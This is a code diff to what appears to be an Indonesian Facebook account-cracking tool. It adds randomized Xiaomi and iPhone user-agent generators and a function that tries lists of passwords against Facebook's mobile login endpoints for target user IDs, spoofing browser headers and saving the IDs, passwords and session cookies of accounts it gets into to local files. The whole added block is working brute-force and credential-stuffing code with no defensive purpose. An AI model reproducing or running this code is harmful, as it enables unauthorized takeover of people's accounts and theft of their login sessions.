@@ -1714,6 +1714,68 @@ def metcepat():
     Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
     print("")
 
+
+def ua_valid():
+    rr = random.randint
+    rc = random.choice
+    android = random.choice(["10","12","13","14"])
+    redmi1 = random.choice(["zh-tw","en-us","zh-cn"])
+    redmi2 = random.choice(["23127PN0CC","23116PN5BC","2206123SC","23076RA4BC","2206122SC","23090RA98C","23013RK75C","22011211C","23078RKD5C","2106118C","2304FPN6DC","22041216UC","22041216C","MI 8 UD"])
+    redmi3 = random.choice(["SP1A.210812.016","UKQ1.230804.001","SKQ1.220303.001","TKQ1.221114.001","TKQ1.220829.002","TP1A.220624.014","TKQ1.220905.001","QKQ1.190828.002"])
+    redmi4 = f"Mozilla/5.0 (Linux; U; Android {android}; {redmi1}; {redmi2} Build/{redmi3}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,109))}.0.{str(rr(4896,5414))}.{str(rr(118,127))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.{str(rr(8,9))}.{str(rr(5,221128))} swan-mibrowser"
+    return rc([redmi4])
+
+def iphonee():
+    rr = random.randint
+    rc = random.choice
+    iphone1 = random.choice(["4_3","9_0"])
+    iphone2 = random.choice(["en-US","en-GB","%lang2%"])
+    iphone3 = random.choice(["533.17.9","600.1.4"])
+    iphone4 = random.choice(["5.0.2","9_0"])
+    iphone = f"Mozilla/5.0 (iPhone; CPU iPhone OS {iphone1} like Mac OS X; {iphone2}) adbeat.com/policy AppleWebKit/{iphone3} (KHTML, like Gecko) Version/{iphone4} Mobile/12A366 Safari/{str(rr(600,6533))}.{str(rr(1,18))}.{str(rr(4,5))}"
+    return rc([iphone])
+	
+# --------------------[ METODE-MOBILE ]-----------------#
+def asyncc(idf, pwv):
+	global loop, ok, cp
+	prog.update(des,description=f" {K2}•{H2} NYOBA {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id2)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
+	prog.advance(des)
+	ses = requests.Session()
+	ua = ua_valid()
+	ua2 = iphonee()
+	for pw in pwv:
+		try:
+			ses.headers.update({"Host": "x.prod.facebook.com","cache-control": "max-age=0","sec-ch-ua-mobile": "?1","upgrade-insecure-requests": "1","user-agent": ua2,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","sec-fetch-site": "none","sec-fetch-mode": "navigate","sec-fetch-dest": "document","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",})
+			link = ses.get(f"https://free.prod.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&next=%2Fcreatorstudio%2F%3Freference%3Dvisit_from_seo&refsrc=deprecated&_rdr")
+			data = {"jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),"uid": idf,"next": "https://free.prod.facebook.com/login/save-device/","flow": "login_no_pin","pass":pw}
+			cuoz = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
+			headd = {"Host": "free.prod.facebook.com","content-length": "980","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://free.prod.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","x-requested-with": "com.opera.mini.native","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": f"https://free.prod.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&next=%2Fcreatorstudio%2F%3Freference%3Dvisit_from_seo&refsrc=deprecated&_rdr","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",}
+			post = ses.post("https://web.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110",data=data,cookies={'cookie': cuoz},headers=headd,allow_redirects=False,)
+			if "checkpoint" in ses.cookies.get_dict().keys():
+				tree = Tree("")
+				tree.add(f"[bold red]uid : {idf}").add(f"[bold red]password : {pw}", style="bold white")
+				tree.add(f"[bold red]useragent : {ua}", style="bold white")
+				print(tree)
+				open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
+				akun.append(idf + "|" + pw)
+				cp += 1
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				ok += 1
+				coki = ses.cookies.get_dict()
+				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
+				tree = Tree("")
+				tree.add(f"[bold green]uid : {idf}").add(f"[bold green]password : {pw}", style="bold white")
+				tree.add(f"[bold green]cookie : {kuki}", style="bold white")
+				print(tree)
+				open("OK/" + okc, "a").write(idf + "|" + pw + "|" + kuki + "\n")
+				break
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(31)
+	loop += 1
+		
 #----------[ METODE-VALIDATE ]----------#
 def validate(idf,pwv):
 	global loop,ok,cp
@@ -1823,7 +1885,7 @@ def validatte(idf,pwv,url):
     loop+=1
 
 #METOD KONTOL LU SEMVAK#
-def asyncc(idf,pwv):
+def asynccc(idf,pwv):
     global loop,ok,cp
     ses = requests.Session()
     rr = random.randint
